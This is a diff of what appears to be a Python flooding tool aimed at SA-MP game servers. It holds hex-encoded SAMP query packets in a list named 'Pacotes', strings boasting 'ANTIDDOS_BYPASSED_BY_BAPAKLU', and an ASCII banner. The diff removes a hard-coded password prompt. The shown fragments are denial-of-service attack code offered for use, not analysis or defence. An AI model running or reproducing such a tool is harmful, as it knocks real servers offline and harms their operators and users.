@@ -1,12 +1,6 @@
 #CODE BY XXBR & ZXZ
 import socket, struct, codecs, sys, threading, random, time, os
 
-password = input("[•] Account :")
-time.sleep(2)
-if password=="DEWTOD ANAK CITAYEM":
-  print("[✓] Akun  Berhasil Masuk")
-  time.sleep(2)
-os.system("clear")
 Pacotes = [
  codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
  codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
@@ -87,6 +81,7 @@ refers = [
      'ANTIDDOS_BYPASSED_BY_BAPAKLU',
      'ANTIDDOS_BYPASSED_BY_BAPAKLU']   
  
+os.system("clear")
 print ("\033[32m                     ╔════════════════════════════════════╗")
 print ("\033[32m                     ║\033[93m  ╔═╗╔═╗╦╔═╦ ╦╦═╗╔═╗\033[32m  ╦╔╗ ╦  ╦╔═╗\033[32m   ║")
 print ("\033[32m                     ║\033[93m  ╚═╗╠═╣╠╩╗║ ║╠╦╝╠═╣\033[32m  ║╠╩╗║  ║╚═╗\033[32m   ║")
